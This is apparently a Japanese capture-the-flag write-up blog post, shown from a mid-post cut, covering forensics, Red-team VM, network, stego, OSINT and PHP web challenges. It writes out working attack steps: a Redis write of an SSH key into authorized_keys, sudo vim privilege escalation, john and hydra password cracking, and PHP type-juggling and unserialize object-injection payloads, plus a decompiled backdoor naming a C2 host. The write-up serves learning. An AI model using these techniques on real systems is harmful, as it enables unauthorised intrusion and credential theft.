ssh.logの中に、以下のログがあったし、絶対これだと思って。。。
<pre>
Jun 25 00:30:00 lockedout cron.info crond[2047]: USER root pid 2878 cmd run-parts /etc/periodic/15min
Jun 25 00:30:00 lockedout cron.info crond[2047]: USER root pid 2879 cmd python3 /bin/stayalive
</pre>

<br />
python byte-compiledファイルだったので、pycdcとかpycdasを使ってコードを調べたりしました。

<br>
c2domainと通信しようとしてそうで、怪しさ満載。

<pre>
$ file /bin/stayalive
/bin/stayalive: python 3.8 byte-compiled

$ pycdas stayalive

...(snip)...
                90      LOAD_CONST              43: 'c2.m1cr0s0ft.hax'
                92      STORE_GLOBAL            1: c2domain
                94      LOAD_CONST              44: 64318
                96      STORE_GLOBAL            2: c2port
                98      LOAD_GLOBAL             3: socket
                100     LOAD_METHOD             3: socket
...(snip)...
</pre>

<br>
でも、解読できなさそうだったので降参。


<br><br>
結局、/root/.viminfoの中にフラグがあったとか。まずは、/root/配下のファイルはちゃんと見ないといけなかったか。。 そうだよね。。

<pre>
lockedout:/# grep flag /root/.viminfo
	            ssls.send(str.encode("flag{b4ckd00rs_4r3_us3full_f0r_p3rs1st3nc3}"))
|3,0,0,1,1,0,1624456492,"            ssls.send(str.encode(\"flag{b4ckd00rs_4r3_us3full_f0r_p3rs1st3nc3}\"))"
</pre>

<br>

Flag: `flag{b4ckd00rs_4r3_us3full_f0r_p3rs1st3nc3}`


<br />

参考までに、以下はLinuxで確認した方がいいファイルのリストです。(~/.viminfo 書かれてます)<br />
[https://gracefulsecurity.com/path-traversal-cheat-sheet-linux/](https://gracefulsecurity.com/path-traversal-cheat-sheet-linux/)


<br /><br />
<br /><br />
## [Mission]: Blue team becomes Red Team (269 points)
- - -
### Challenge
> We now need to exploit this server in order to find useful information from our attacker.
<br /><br />
Let’s use our Red team skills and get foothold on the machine.

Attachment:

- hyp3r10n.ova


<br />

### Solution
（Lockされてたやつが、イベント後に見れるようになっていたので、後日やってみました。）

まずは nmap で空いているポートを確認します。

<pre>
$ ports=$(nmap -p- --min-rate=1000 -T4 192.168.0.123 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
$ nmap -p$ports -sC -sV 192.168.0.123
Starting Nmap 7.92 ( https://nmap.org ) at 2021-08-13 05:01 +08
Nmap scan report for 192.168.0.123
Host is up (0.00078s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey:
|   3072 38:08:fc:0d:8a:8a:f8:ea:fb:4d:6c:af:1d:22:e1:ff (RSA)
|   256 2d:d7:bf:a1:62:58:18:d9:80:e7:7c:15:c6:d6:32:64 (ECDSA)
|_  256 34:7a:7e:dd:ba:a7:be:d7:3c:0e:9b:5a:73:cb:86:cb (ED25519)
80/tcp   open  http    Node.js Express framework
|_http-title: Hyperion Group - Coming Soon
6379/tcp open  redis   Redis key-value store 6.0.14

</pre>

<br />
明らかに `redis` が怪しいですね。Redisの脆弱性を突く手法は HTB/Postman で出てきています。このチャレンジでも、同じ事が可能です。

なお、以下の -x set aaa の部分の文字列 "aaa" は、なんでもいいみたいです。
<pre>
$ (echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > ssh.txt
$ cat ssh.txt | redis-cli -h 192.168.0.123 -x set aaa
OK
$ redis-cli -h 192.168.0.123
192.168.0.123:6379> config set dir /var/lib/redis/.ssh/
OK
192.168.0.123:6379> config set dbfilename "authorized_keys"
OK
192.168.0.123:6379> save
OK
192.168.0.123:6379>
</pre>

<br>

次に、実際にSSHした後、例によって `sudo -l` から別のユーザ `hype` にて shell script の書き換え＆実行ができることがわかります。スクリプト ファイルに `/bin/ash` を追加して実行すると、hypeになれます。

hypeのホームに user.txt があります。

<pre>
$ ssh -i ~/.ssh/id_rsa redis@192.168.0.123
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <http://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

hyp3r10n:~$ id
uid=100(redis) gid=101(redis) groups=101(redis),101(redis)

hyp3r10n:~$ sudo -l
User redis may run the following commands on hyp3r10n:
    (hype) NOPASSWD: /home/hype/backup.sh, /usr/bin/vim /home/hype/backup.sh

hyp3r10n:~$ sudo -u hype /usr/bin/vim /home/hype/backup.sh

hyp3r10n:~$ sudo -u hype /home/hype/backup.sh
tar: removing leading '/' from member names

hyp3r10n:/var/lib/redis$ id
uid=1000(hype) gid=1000(hype) groups=1000(hype)

hyp3r10n:/var/lib/redis$ cd

hyp3r10n:~$ ls -al
total 248
drwx------    4 hype     hype          4096 Aug 12 22:50 .
drwxr-xr-x    3 root     root          4096 Jul  6 08:59 ..
lrwxrwxrwx    1 root     hype             9 Jul  6 09:53 .ash_history -> /dev/null
drwx------    2 hype     hype          4096 Aug 12 22:49 .ssh
-rw-------    1 hype     hype         10374 Aug 12 22:46 .viminfo
-rwxr-xr-x    1 hype     hype           231 Aug 12 22:46 backup.sh
drwxr-xr-x    3 hype     hype          4096 Aug 13 04:44 backups
-rw-r--r--    1 hype     hype            31 Jul  7 12:25 user.txt

hyp3r10n:~$ cat user.txt
flag{succ3ssfully_1nf1ltr4t3d}
</pre>

<br>

Flag: `flag{succ3ssfully_1nf1ltr4t3d}`


<br /><br />
<br /><br />
## [Mission]: Getting the crown jewels (269 points)
- - -
### Challenge
> We recently found a private SSH key that will allow us to login in the attached machine.
<br /><br />
However, we can't seem to be able to login through SSH.
<br /><br />
Can you help us out?
<br /><br />
No brute force is required.


<br />

### Solution
（前述の 'Blue team becomes Red Team' の続きのチャレンジです。）

ホーム配下にあるファイルを確認すると、private keyが見つかります。catを使ってローカルに持ってきます（中身のコピペ）。

<pre>
hyp3r10n:~$ find .
.
./backups
./backups/site_backup_Jul-06-21.tar.gz
./backups/site_backup_Aug-12-21.tar.gz
./backups/ssh
./backups/ssh/id_rsa.bak
./backups/ssh/note.txt
./backups/site_backup_Aug-13-21.tar.gz
./.ssh
./.ssh/known_hosts
./.ash_history
./backup.sh
./.viminfo
./user.txt

hyp3r10n:~$ cat ./backups/ssh/note.txt
This is a backup of my private key, just in case

hyp3r10n:~$ cat ./backups/ssh/id_rsa.bak
...(snip)...
</pre>


<br>

ssh2john.py と John The Ripperで、パスフレーズ `barcelona1` が取れます。


<pre>
$ ssh2john.py id_rsa.bak > hash.txt

$ ~/john/run/john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
barcelona1       (id_rsa.bak)
1g 0:00:00:00 DONE (2021-08-13 06:00) 50.00g/s 1003Kp/s 1003Kc/s 1003KC/s blackstar..angie123
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

</pre>

<br>

パスワードリストを作って hydra をかけてみたんですが、hypeのパスワードはヒットせず。

<pre>
$ for i in {100..1000} ; do (echo barcelona${i}) ; done > passwd_list.txt

$ hydra -l hype -P passwd_list.txt -t20 192.168.0.123 -s22 -I ssh
$ hydra -l root -P passwd_list.txt -t20 192.168.0.123 -s22 -I ssh
</pre>


<br>
root アカウントに関しては、そもそもsshが許可されていませんでした。。。

<pre>
hyp3r10n:~$ grep -i root /etc/ssh/sshd_config
#PermitRootLogin prohibit-password
# the setting of "PermitRootLogin without-password".
#ChrootDirectory none
</pre>

<br>
結局、barcelona1 は root のパスワードで、su root をするだけだったというオチ。。。

<pre>
hyp3r10n:~$ su root
Password:

hyp3r10n:/home/hype# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)

hyp3r10n:/home/hype# cd /root/

hyp3r10n:~# ls -al
total 1128
drwx------    6 root     root          4096 Jul  9 09:49 .
drwxr-xr-x   22 root     root          4096 Jun  8 23:14 ..
lrwxrwxrwx    1 root     root             9 Jul  6 08:59 .ash_history -> /dev/null
drwx------    3 root     root          4096 Jul  5 17:27 .config
-rw-------    1 root     root           684 Jun  9 10:20 .joe_state
drwxr-xr-x    5 root     root          4096 Jul  6 09:52 .npm
-rw-------    1 root     root            98 Jul  6 12:10 .rediscli_history
drwx------    2 root     root          4096 Jul  7 11:37 .ssh
-rw-------    1 root     root         10067 Jul  7 12:25 .viminfo
drwxr-xr-x    3 root     root          4096 Jul  9 09:47 Projects
-rw-r--r--    1 root     root       1101233 Jul  9 09:49 home.zip
-rw-r--r--    1 root     root            25 Jul  7 12:22 root.txt
-rw-r--r--    1 root     root             5 Jul  6 09:08 supervisord.pid

hyp3r10n:~# cat root.txt
flag{h4ck1ng_th3_h4ck3r}

</pre>

<br />

Flag: `flag{h4ck1ng_th3_h4ck3r}`


<br /><br />
<br /><br />
## [Mission]: Locating our Attacker (443 points)
- - -
### Challenge
> We’ve discovered some projects and a zip file inside the server. Let’s see if we can figure some information of our attacker from those, maybe we can track down our attacker and report it to the authorities.
<br /><br />
Flag format: flag{'BSSID'_'email'}


<br />

### Solution
（これも続きです。）

/root/ 配下に、確かに Projects と home.zip があります。

Projectsの方は、.git ディレクトリがあります。これを見つけたらいつもhistoryを確認することにしてます。

<pre>
hyp3r10n:~# pwd
/root

hyp3r10n:~# ls -al
total 1128
drwx------    6 root     root          4096 Jul  9 09:49 .
drwxr-xr-x   22 root     root          4096 Jun  8 23:14 ..
lrwxrwxrwx    1 root     root             9 Jul  6 08:59 .ash_history -> /dev/null
drwx------    3 root     root          4096 Jul  5 17:27 .config
-rw-------    1 root     root           684 Jun  9 10:20 .joe_state
drwxr-xr-x    5 root     root          4096 Jul  6 09:52 .npm
-rw-------    1 root     root            98 Jul  6 12:10 .rediscli_history
drwx------    2 root     root          4096 Jul  7 11:37 .ssh
-rw-------    1 root     root         10067 Jul  7 12:25 .viminfo
drwxr-xr-x    3 root     root          4096 Jul  9 09:47 Projects
-rw-r--r--    1 root     root       1101233 Jul  9 09:49 home.zip
-rw-r--r--    1 root     root            25 Jul  7 12:22 root.txt
-rw-r--r--    1 root     root             5 Jul  6 09:08 supervisord.pid

hyp3r10n:~# ls -al Projects/
total 12
drwxr-xr-x    3 root     root          4096 Jul  9 09:47 .
drwx------    6 root     root          4096 Jul  9 09:49 ..
drwxr-xr-x    3 root     root          4096 Jul  9 09:55 scripts

hyp3r10n:~# ls -al Projects/scripts/
total 28
drwxr-xr-x    3 root     root          4096 Jul  9 09:55 .
drwxr-xr-x    3 root     root          4096 Jul  9 09:47 ..
drwxr-xr-x    8 root     root          4096 Jul  9 09:55 .git
-rw-r--r--    1 root     root          1799 Jul  9 09:47 .gitignore
-rw-r--r--    1 root     root           101 Jul  9 09:47 README.md
-rw-r--r--    1 root     root           433 Jul  9 09:47 rshell.ino
-rw-r--r--    1 root     root          2636 Jul  9 09:55 wifigrabber.ino

hyp3r10n:~# cd Projects/scripts/.git/

hyp3r10n:~/Projects/scripts/.git# git log -p --all --full-history

commit da59093e90bdad57ad87f67d295a5e85ded7f941 (HEAD -> main, origin/main, origin/HEAD)
Author: Mateos Santiago &lt;mateossanti0@gmail.com>

</pre>

<br />

home.zipに関しては、パスワードが付いているので、ローカルにscpしてきた後 john で crack します。結局、同じパスワード (barcelona1) でした。

<pre>
$ zip2john home.zip > hash.txt
ver 5.1 home.zip/IMG_3953.JPG is not encrypted, or stored with non-handled compression type
ver 5.1 home.zip/Wifi config.txt is not encrypted, or stored with non-handled compression type

$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
barcelona1       (home.zip/IMG_3953.JPG)
1g 0:00:00:00 DONE (2021-08-13 17:57) 1.369g/s 28054p/s 28054c/s 28054C/s christal..michelle4
Use the "--show" option to display all of the cracked passwords reliably
Session completed

$ unzip home.zip

$ cat home/Wifi\ config.txt
SSID: MOVISTAR_56F7
Pwd: barcelona1
</pre>

<br />

Flag: `flag{MOVISTAR_56F7_mateossanti0@gmail.com}` （こうかな？ もしかしたら違うかもです。）



<br /><br />
<br /><br />
## [Network]: Knock Knock (100 points)
- - -
### Challenge
> We recently found a private SSH key that will allow us to login in the attached machine.
<br /><br />
However, we can't seem to be able to login through SSH.
<br /><br />
Can you help us out?
<br /><br />
No brute force is required.

Attachment:

- id_rsa
- knock_knock.ova


<br />

### Solution
チャレンジ文より、port knockingをしてSSHポートを開けた後、private keyを使ってSSHするのは明らかです。

ちなみに、port knockingを使ったものでは、VulnHubにある [DC9](https://www.vulnhub.com/entry/dc-9,412/) があります。 これは、OSCPの勉強中にやりました。

DC9の方では、Webの脆弱性を用いて /etc/knockd.conf を取得するやり方でしたが、こちらのチャレンジでは Anonymous ftp をするとバナーにポート番号が表示されるものでした。

<img src="https://captureamerica.github.io/writeups/img/rcts_cert_CTF_2021_knock_knock_ftp.png" alt="rcts_cert_CTF_2021_knock_knock_ftp.png">

<br />
{{% admonition tip "Tips" %}}
FTP getの末尾にハイフン('-')を付けるとファイルの中身だけ見れます。
{{% /admonition %}}


<br />

なお、どのサービスが動いているかは、nmapせずとも起動時の出力結果でわかります。サーバーがリモートかローカルで、こういう所が違ってきますね。

<img src="https://captureamerica.github.io/writeups/img/rcts_cert_CTF_2021_knock_knock_boot.png" alt="rcts_cert_CTF_2021_knock_knock_boot.png">

<br />

以下のようにport knockingすると、SSHポートが開きます。(closed -> open)

<pre>
$ nmap -p22 -sT 192.168.0.199
Starting Nmap 7.92 ( https://nmap.org ) at 2021-08-13 02:16 +08
Nmap scan report for 192.168.0.199
Host is up (0.0012s latency).

PORT   STATE  SERVICE
22/tcp closed ssh

Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds

$ knock 192.168.0.199 7000 8000 9000

$ nmap -p22 -sT 192.168.0.199
Starting Nmap 7.92 ( https://nmap.org ) at 2021-08-13 02:16 +08
Nmap scan report for 192.168.0.199
Host is up (0.00095s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
</pre>

<br />

これで ssh ができるわけですが、ユーザ名が必要です。

チャレンジ文に `No brute force is required.` と書かれているし、動いているサービスも限られるのでどうしたものかと少々悩んだんですが、Discordを見てたら「username in id_rsa」というヒントを発見。

そうだっけ？と思いつつ、base64 decodeしてみるとユーザ名 'ctf' が見つかりました。

<img src="https://captureamerica.github.io/writeups/img/rcts_cert_CTF_2021_knock_knock_username.png" alt="rcts_cert_CTF_2021_knock_knock_username.png">

<br>

なお、以下の2つのどちらのコマンドでも同じ結果が得られます。

<pre>
$ openssl enc -d -base64 -in id_rsa
$ grep -v "OPENSSH PRIVATE KEY" id_rsa | tr -d "\n" | base64 -d
</pre>

<br>

sshすると、ホームにflag.txtが見つかります。

<pre>
$ ssh -i id_rsa ctf@192.168.0.199
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <http://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

knockknock:~$ ls -al
total 32
drwxr-sr-x    3 ctf      ctf           4096 Jun 14 14:50 .
drwxr-xr-x    3 root     root          4096 Jun  9 14:58 ..
-rw-------    1 ctf      ctf           1391 Aug 12 19:36 .ash_history
-rw-------    1 ctf      ctf              7 Jun 11 11:34 .python_history
drwx--S---    2 ctf      ctf           4096 Jun 14 15:15 .ssh
-rw-------    1 ctf      ctf           6058 Jun 14 14:50 .viminfo
-rw-r--r--    1 root     ctf             34 Jun 14 09:09 flag.txt

knockknock:~$ cat flag.txt
flag{kn0ck1ng_0n_d00rs_1s_p0l1t3}

</pre>

<br />

Flag: `flag{kn0ck1ng_0n_d00rs_1s_p0l1t3}`


<br />

なお、/etc/knockd.conf は以下のようになってました。

<pre>
knockknock:~$ cat /etc/knockd.conf
[options]
	logfile = /var/log/knockd.log

[openSSH]
	sequence    = 7000,8000,9000
	seq_timeout = 15
	command     = /sbin/iptables -I INPUT -p tcp --dport 22 -j ACCEPT
	tcpflags    = syn

[closeSSH]
	sequence    = 11000,12000,13000
	seq_timeout = 15
	command     = /sbin/iptables -D INPUT -p tcp --dport 22 -j ACCEPT
	tcpflags    = syn

</pre>



<br /><br />
<br /><br />
## [Forensics]: Keyp it universal (100 points)
- - -
### Challenge
> We intercepted a strange communication which we believe has important information inside.
<br /><br />
Can you retrieve the information from it?
<br /><br />
Flag format: flag{string}
<br /><br />
Regex: flag{[0-9a-z_]+}


Attachment:

- capture.pcap

<br />

### Solution
USB pcapです。

これは、[sarCTF_2020](https://captureamerica.github.io/writeups/post/sarctf_2020/) で以前やったチャレンジとほぼ同様です。

<pre>
$ tshark -r capture.pcap -T fields -e usb.capdata | tr -s "\n" > usb.capdata
$ python3 ./usb.py usb.capdata
flag[usb-p4ck3t-c4ptur3-1s-fun]
</pre>

<br>

Flag: `flag{usb_p4ck3t_c4ptur3_1s_fun}`


<br>
usb.pyは他の方の書いたコードなので、今回もここには載せません。どこからもらってきたのかも、全く覚えてないです。。




<br /><br />
<br /><br />
## [Forensics]: Maybe the helper can help (100 points)
- - -
### Challenge
> You might not see it, but a flag lies within.

Attachment:

- the-jetsons-family.jpg

<br />

### Solution
(イベント終了後にWriteupを参照させてもらって解きました。)

「青い空を見上げればいつもそこに白い猫」 を使ったところ、「steghideの可能性あり」とのことだったんですが、パスフレーズがわからなくて降参したやつです。

<img src="https://captureamerica.github.io/writeups/img/rcts_cert_CTF_2021_neko.png" alt="rcts_cert_CTF_2021_neko.png">

<br />

（ここで、他の方のwriteupを参照させてもらっています。）

[stegseek](https://github.com/RickdeJager/stegseek) というツールでパスフレーズが見つかるようですね。初めて使いました。

<br />

特に、rockyou.txt を指定しなくても、crackできちゃうみたいです。しかも、パスフレーズを見つけた後に crack までやってくれます。

<pre>
$ stegseek the-jetsons-family.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "rosey"
[i] Original filename: "steganopayload986089.txt".
[i] Extracting to "the-jetsons-family.jpg.out".

$ cat the-jetsons-family.jpg.out ; echo
Wm14aFozdFVhRVZtVlhSVmNrVnBVMjVQZHlGOQ==

$ cat the-jetsons-family.jpg.out | base64 -d ; echo
ZmxhZ3tUaEVmVXRVckVpU25PdyF9

$ cat the-jetsons-family.jpg.out | base64 -d | base64 -d ; echo
flag{ThEfUtUrEiSnOw!}

</pre>

<br />

Flag: `flag{ThEfUtUrEiSnOw!}`


<br /><br />
<br /><br />
## [OSINT]: Welcome to Lisbon! (100 points)
- - -
### Challenge
> Oh, some activists defaced a Victoria Secret's store.
<br /><br />
Find out which was the model whose photo was damaged.


Attachment:

- welcome_to_lisbon.jpg

<img src="https://captureamerica.github.io/writeups/img/welcome_to_lisbon.jpg" alt="welcome_to_lisbon.jpg">


<br />

### Solution
普段はOSINTチャレンジはパスするんですが、今回はちょっと頑張りました。

赤塗されたところのモデルの名前を見つけてください、というチャレンジ。

ぱっと見、空港っぽいし、'Welcome To Lisbon!' とのことなので、`"victoria's secret" Lisbon airport` でググるとモデルの写真は見つかります。

<img src="https://captureamerica.github.io/writeups/img/rcts_cert_CTF_2021_Lisbon.png" alt="rcts_cert_CTF_2021_Lisbon.png">

<br />

この後、ひたすらググって調べるんですが、下着の女性の写真ばっかり出てくるので家族に見られるとヤバいやつです。

`victoria secret's model faces` というキーワードで顔にフォーカスしてググるのがポイントだったと思います。

何度かトライ＆エラーして、フラグ通しました。

<br />

Flag: `flag{Adriana_Lima}`



<br /><br />
<br /><br />
## [Web]: Some type of juggling (100 points)
- - -
### Challenge
> Can you solve this challenge?
<br /><br />
URL: [http://challenges.defsoc.tk:8080](http://challenges.defsoc.tk:8080)

<br />

### Solution
ソースコードが見えるようになっています。例のPHPの `0e` の比較のやつです。

```PHP
<?php
    if(isset($_GET['source'])) {
        highlight_file(__FILE__);
        die();
    } else {
        $value = "240610708";
        if (isset($_GET['hash'])) {
            if ($_GET['hash'] === $value) {
                die('It is not THAT easy!');
            } 
            $hash = md5($_GET['hash']);
            $key = md5($value);
            if($hash == $key) {
                include('flag.php');
                print "Congratulations! Your flag is: $flag";
            } else {
                print "Flag not found!";
            }
        } 
    }
?>
```

<br />

以下から`QLTHNDT`をピックアップしました。<br />
https://github.com/spaze/hashes/blob/master/md5.md

<br />

以下にアクセスすると、フラグが得られます。<br />
<pre>
http://challenges.defsoc.tk:8080/index.php?hash=QLTHNDT
</pre>

<br />

Flag: `flag{php_typ3_juggl1ng_1s_c00l}`



<br /><br />
<br /><br />
## [Web]: It is Magic after all (100 points)
- - -
### Challenge
> Can you do some magic in this page?
<br /><br />
URL: [http://challenges.defsoc.tk:3000](http://challenges.defsoc.tk:3000)

<br />

### Solution
ソースコードが見えるようになっています。

```PHP
<?php 
include "flag.php";  

class Magic {
    public $key;

    public function doMagic() {
        if ($this->key === true) {
          global $flag;
          echo $flag;
        }
        else {
            echo "Nothing...";
        }
    }
}

if (isset($_GET['magic'])) {  
    $magic = unserialize($_GET['magic']); 
    $magic->doMagic();
} else {
    print "Nothing...";
}  

?>
```

<br />

参考情報：

[https://www.php.net/manual/ja/function.unserialize.php](https://www.php.net/manual/ja/function.unserialize.php)

{{% admonition quote "引用" %}}
警告

allowed_classes の options の値にかかわらず、 ユーザーからの入力をそのまま unserialize() に渡してはいけません。 アンシリアライズの時には、オブジェクトのインスタンス生成やオートローディングなどで コードが実行されることがあり、悪意のあるユーザーがこれを悪用するかもしれないからです。 シリアル化したデータをユーザーに渡す必要がある場合は、安全で標準的なデータ交換フォーマットである JSON などを使うようにしましょう。 json_decode() および json_encode() を利用します。
{{% /admonition %}}

<br />

OWASPでも説明されていて、今回の回答に非常に近いものも載ってます。<br />
[https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)

<br />

<pre>
$ curl 'http://challenges.defsoc.tk:3000/?magic=O:5:"Magic":1:{s:3:"key";b:1;}'

Magic happens here >>> flag{php_d3s3r14l1z4t10n_3xpl01ts}

...(snip)...
</pre>

- O は、大文字のオー。
- 5 は、"Magic" の文字数。
- 1 は、要素数。{}の中に複数書けるけど、今回は１つ。
- s:3は、String "Key"の文字数。
- b:1は、booleanで1をセット。

Oの代わりに0を使ったり、bの代わりにi (integer) を使ったりして、ちょっとハマりました。。。

<br>

Flag: `flag{php_d3s3r14l1z4t10n_3xpl01ts}`



<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />
